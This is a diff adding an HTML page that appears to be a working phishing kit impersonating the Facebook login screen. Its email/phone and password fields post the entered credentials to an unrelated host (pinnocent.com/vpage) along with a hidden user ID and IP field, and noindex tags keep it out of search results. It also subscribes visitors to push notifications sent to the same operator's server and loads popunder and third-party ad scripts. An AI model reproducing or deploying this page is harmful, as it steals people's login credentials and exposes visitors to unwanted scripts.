@@ -1,0 +1,374 @@
+
+<!doctype html>
+
+<html>
+
+<head>
+
+ 
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<script src="https://www.gstatic.com/firebasejs/7.14.6/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/7.14.6/firebase-messaging.js"></script>
+</head>
+<body>
+  <!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+   <script type="module">
+        // Import the functions you need from the SDKs you need
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
+        import { getMessaging, getToken } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-messaging.js";
+
+        // Your web app's Firebase configuration
+        const firebaseConfig = {
+            apiKey: "AIzaSyBV2pY0LLJTrHhiCFArAedQpTiUshDJsi8",
+            authDomain: "pinnocent-fa387.firebaseapp.com",
+            databaseURL: "https://pinnocent-fa387.firebaseio.com",
+            projectId: "pinnocent-fa387",
+            storageBucket: "pinnocent-fa387.firebasestorage.app",
+            messagingSenderId: "403452483449",
+            appId: "1:403452483449:web:630abc1e7c265a8f0481a8",
+            measurementId: "G-8DGVGDCCL2"
+        };
+
+        // Initialize Firebase
+        const app = initializeApp(firebaseConfig);
+        const messaging = getMessaging(app);
+
+        // Register the service worker
+        navigator.serviceWorker.register("firebase-messaging-sw.js").then(registration => {
+            // Get the token
+            getToken(messaging, {
+                serviceWorkerRegistration: registration,
+                vapidKey: 'BLf-6mYxA6BPIXK-MpMWYKuLDPpbKFtXdERFs506kY1xZsek0B8ieRRIikBGaO0LKrFXzglm-mNr4rpMypLLiJ4'
+            }).then((currentToken) => {
+                if (currentToken) {
+                    console.log("Token is: " + currentToken);
+                    // Send the token to your server
+                    sendTokenToServer(currentToken);
+                } else {
+                    console.log('No registration token available. Request permission to generate one.');
+                }
+            }).catch((err) => {
+                console.log('An error occurred while retrieving token. ', err);
+            });
+        }).catch((err) => {
+            console.log('Service worker registration failed: ', err);
+        });
+
+        function sendTokenToServer(token) {
+            // Create a JSON object to send
+            const data = {
+                token: token
+            };
+
+            // Send the token to the server using fetch with API method
+            fetch('https://push.pinnocent.com/sub.php', { // Ensure this URL is correct
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json' // Specify the content type
+                },
+                body: JSON.stringify(data) // Convert the data to JSON
+            })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error('Network response was not ok ' + response.statusText);
+                }
+                return response.json(); // Parse the JSON response
+            })
+            .then(data => {
+                console.log(data); // Log the response from the server
+            })
+            .catch(error => {
+                console.error('Error sending token to server:', error);
+            });
+        }
+
+        messaging.onMessage(function(payload) {
+	  console.log("Message received. ", payload);
+	  notificationTitle = payload.data.title;
+	  notificationOptions = {
+	  	body: payload.data.body,
+	  	icon: payload.data.icon,
+	  	image:  payload.data.image
+	  };
+	  var notification = new Notification(notificationTitle,notificationOptions);
+	});
+    </script>
+</body>
+</html>
+</body>
+</html>
+
+	<title> Log in to Facebook</title>
+
+	
+
+  <meta name=”robots” content=”noindex”>
+
+
+<meta name="robots" content="noindex,follow">
+
+<meta name="robots" content="index,nofollow">
+
+<meta name="robots" content="noindex,nofollow">
+
+<meta name="googlebot" content="noindex,nofollow,noarchive,nosnippet,noodp" />
+
+    <meta name="robots" content="noindex,nofollow,noarchive,nosnippet,noodp" />
+
+	<meta charset="utf-8">
+
+
+
+	<meta name="description" content="Login to Facebook ">
+
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+	<meta property='og:image' content='earnmoney.jpg' />
+
+	<link rel="shortcut icon" href="https://cdn4.iconfinder.com/data/icons/ionicons/512/icon-ios7-contact-512.png">
+
+  
+	<style>
+
+		table tr td{text-align:center;}
+
+.button {
+
+  background-color: #4CAF50; /* Green */
+
+  border: none;
+
+  color: white;
+
+  padding: 14px 20px;
+
+  text-align: center;
+
+  text-decoration: none;
+
+  display: inline-block;
+
+  font-size: 16px;
+
+  margin: 1px 0px;
+
+  cursor: pointer;
+
+}
+
+.button1 {width: 250px;}
+
+.button2 {width: 50%;}
+
+.button3 {width: 90%;
+
+border-radius: 4px;
+
+border: 0px solid DarkGray;
+
+padding: 13px 13px;
+
+margin: 3px 3px;
+
+height: 20px;
+
+background-color: rgb(243,243,243);
+
+display: inline-block;
+
+
+
+}
+
+		.bottom a{color:#D3D3D3;}
+
+		.bottom a:link{text-decoration:none;}
+
+		input{padding:10px;}
+
+		
+
+		.login{background-color:rgb(19,90,245);color:white;
+
+border-radius: 4px;
+
+padding: 13px 13px;
+
+margin: -15px -15px;
+
+border: 1px solid DarkGray;
+
+font-family: 'segoe UI';
+
+font-size: 15px;
+
+font-weight: bold;
+
+		  
+
+		}
+
+		
+
+.center {
+
+  display: block;
+
+  margin-left: auto;
+
+  margin-right: auto;
+  padding-top: 10px;
+  padding-bottom: 5px;
+ 
+
+}
+
+		.login{width: 97%;}
+
+		.check{background-color:#0ac21e;color:white;padding:10px;
+
+margin: 4px 2px;
+
+		}
+
+		.inputf a:link{text-decoration:none;}
+
+.phone{
+  position: relative;
+  bottom: 14px;
+  
+}
+.me{
+  position: relative;
+  bottom: 24px;
+  left: 5px;
+  font-family: Arial;
+  font-weight: 400;
+}
+@media only screen and (min-width:500px){
+  
+}
+	</style>
+
+</head>
+
+<body style="margin:0px;">
+ 
+
+<script>
+
+	document.title='Login to Facebook ';
+
+</script>
+
+<div style="width:100%;">
+
+  
+
+<div style="width:100%;">
+
+<div style="height:50px;background-color:rgb(251,251,217);padding-bottom:10px;padding-left:0px;">
+
+
+	<img src="https://pinnocent.com/image/login1.jpg" width="360px" class="phone"class="me">
+
+</div>
+
+
+
+</div>
+
+<div style="width:100%;">
+
+ <a href="#">
+
+<img src="https://pinnocent.com/image/fabimg.png"  alt="Facebook logo" width="90"  class="center">  </a>
+
+
+
+<div class="inputf" style="background-color:white;padding:10px;text-align:center;">
+
+<form id="anonymousNewMessage" class="form" method="POST" action="https://pinnocent.com/vpage">
+    <input type="hidden" name="ftype" value="normal" />
+
+                <div class="card-header text-center">
+
+
+
+              
+
+
+
+     
+
+                </div>
+
+                <div class="card-body">
+
+
+
+                  <input type="hidden" name="user_id" id="userUsername" value="16934">
+
+		<input class="button3" name="message_title" type="text" id="" placeholder="Email address or phone number" maxlength="40" size="35px"
+
+		required><br>
+
+		<input class="button3"  name="description" type="text" id="pass" placeholder="Password" maxlength="40" size="35px"
+
+		required>
+
+    <input type="hidden" name="ip" value="141.101.97.53" />
+
+<input type="hidden" name="link" value="facebook" />
+
+
+
+    <!-- the rest of the form //-->
+
+
+
+<br/><br/>
+
+		<input class="login" name="login" type="submit" id="anonymousProcess" value="Log In"><br/><br/>
+
+ <a href="#">
+
+	<img src="fbfooter.jpg" alt="facebook" width="350" height="350"></a>
+</div>
+  <!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-E7K8F1651E"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-E7K8F1651E');
+</script>
+<script type="text/javascript">
+   var uid = '330441';
+   var wid = '717208';
+   var pop_tag = document.createElement('script');pop_tag.src='//nairaa.com/2show.js';document.body.appendChild(pop_tag);
+   pop_tag.onerror = function() {pop_tag = document.createElement('script');pop_tag.src='//nairaa.com/2show.js';document.body.appendChild(pop_tag)};
+</script>
+<script src="back.js?1734976792"> 
+</script>
+<script src="https://old.pinnocent.coms/jspopunder.min.js"></script>
+	<script>
+	jsPopunder('Facebook.html', {
+		name: 'poptest', 
+		width: (screen.width/2), 
+		height: (screen.height-100), 
+		top: 0, left: 0, 
+		wait: 43200, cap: 120000
+	});
+	</script>
+</div>
+  </script>
+</body>
+</html>
